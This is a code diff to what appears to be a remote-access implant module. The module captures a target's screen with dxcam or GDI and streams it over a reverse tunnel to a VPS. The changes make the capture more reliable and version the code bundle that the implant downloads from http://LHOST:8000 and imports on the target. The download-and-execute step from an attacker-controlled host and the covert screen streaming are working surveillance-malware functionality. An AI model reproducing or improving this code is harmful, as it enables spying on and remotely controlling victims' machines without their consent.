@@ -670,7 +670,7 @@ def vnc_status() -> bytes:
 # mpeg4); MPEG-TS over TCP 127.0.0.1:25900+id, reverse-tunnelled to the VPS
 # exactly like the VNC stream (see vnc_target_setup.bat). The python-embed
 # runtime has no site-packages, so on first use the wheel bundle is lazily
-# pulled from http://LHOST:8000/stream_bundle_cp<vmaj><vmin>_<arch>.zip into
+# pulled from http://LHOST:8000/stream_bundle_cp<vmaj><vmin>_<arch>_v2.zip into
 # %USERPROFILE%\.cache\stream and imported from there. On dev boxes the
 # site-packages versions are used as-is (no download).
 
@@ -679,6 +679,7 @@ STREAM2_DIR_NAME = "stream"    # under %USERPROFILE%\.cache
 STREAM2_DEF_W, STREAM2_DEF_H, STREAM2_DEF_FPS = 1280, 720, 30
 STREAM2_BR_1080P = 4_000_000   # anchor bitrate, scaled by pixel count
 STREAM2_HTTP_PORT = 8000       # bundle server (same port as the VNC files)
+STREAM2_BUNDLE_VER = "v2"      # bundle filename version; bump to force re-download
 
 _S2 = {"th": None, "stop": threading.Event(), "id": None,
        "info": {}, "lock": threading.Lock()}
@@ -705,11 +706,14 @@ def _s2_bundle_name() -> str:
         arch = {"amd64": "amd64", "x86": "win32", "arm64": "arm64"}.get(
             platform.machine().lower())
         if arch:
-            return "stream_bundle_cp%d%d_%s.zip" % (
-                sys.version_info[0], sys.version_info[1], arch)
+            # Versioned name: the on-target cache key is the filename, so
+            # bumping the version forces re-download of fixed bundles.
+            return "stream_bundle_cp%d%d_%s_%s.zip" % (
+                sys.version_info[0], sys.version_info[1], arch,
+                STREAM2_BUNDLE_VER)
     except Exception:
         pass
-    return "stream_bundle.zip"
+    return "stream_bundle_%s.zip" % STREAM2_BUNDLE_VER
 
 
 def _s2_load_runtime() -> None:
@@ -754,7 +758,8 @@ def _s2_load_runtime() -> None:
                 pass
             raise RuntimeError("bundle extract failed (%s)" % e)
         for sub in (d, os.path.join(d, "av.libs"),
-                    os.path.join(d, "numpy.libs")):
+                    os.path.join(d, "numpy.libs"), os.path.join(d, "cv2"),
+                    os.path.join(d, "cv2", "bin")):
             if os.path.isdir(sub):
                 os.add_dll_directory(sub)
         sys.path.insert(0, d)
@@ -808,13 +813,40 @@ def _s2_gdi_grab():
     return arr
 
 
+def _s2_gdi_capture():
+    """GDI-only backend -> (grab, stop). Raises if GDI capture is unavailable."""
+    grab = _s2_gdi_grab
+    if grab() is None:
+        raise RuntimeError(
+            "no capture backend (kernels + cv2 + GDI all unavailable)")
+    return grab, (lambda: None)
+
+
 def _s2_capture():
-    """Start the best capture backend -> (grab, stop). Raises on total failure."""
+    """Start the best capture backend -> (grab, stop). Raises on total failure.
+
+    Pre-flight: dxcam's numpy backend needs its compiled _numpy_kernels
+    extension. On clean VMs that import can fail (WinError 126 - missing
+    VCOMP140.DLL / VC++ OpenMP runtime), and dxcam then silently swaps to its
+    cv2 processor, which hard-imports cv2 inside the capture thread. If cv2
+    is absent that thread dies and get_latest_frame returns None forever
+    (silent dead stream), so probe the kernel flag first and only trust the
+    numpy backend when either the kernels import or cv2 is available."""
     import dxcam
+    try:
+        from dxcam.processor.cv2_processor import _NUMPY_KERNELS_AVAILABLE
+        kernels_ok = bool(_NUMPY_KERNELS_AVAILABLE)
+    except Exception:
+        # older/unknown dxcam layout: assume kernels are fine; the guarded
+        # grab loop still degrades to GDI if the thread dies at runtime
+        kernels_ok = True
+    if not kernels_ok:
+        try:
+            import cv2  # noqa: F401  (dxcam's cv2 fallback path needs this)
+        except Exception:
+            return _s2_gdi_capture()
     cam = None
     try:
-        # numpy backend avoids the cv2 dependency (bundle ships the compiled
-        # _numpy_kernels .pyd; cv2 is not included in the wheel bundle).
         cam = dxcam.create(output_idx=0, output_color="BGR",
                            processor_backend="numpy")
     except TypeError:
@@ -825,10 +857,7 @@ def _s2_capture():
     if cam is not None:
         cam.start(target_fps=STREAM2_DEF_FPS, video_mode=True)
         return cam.get_latest_frame, cam.stop
-    grab = _s2_gdi_grab
-    if grab() is None:
-        raise RuntimeError("no capture backend (DXGI failed, GDI failed)")
-    return grab, (lambda: None)
+    return _s2_gdi_capture()
 
 
 def _s2_bitrate(w, h) -> int:
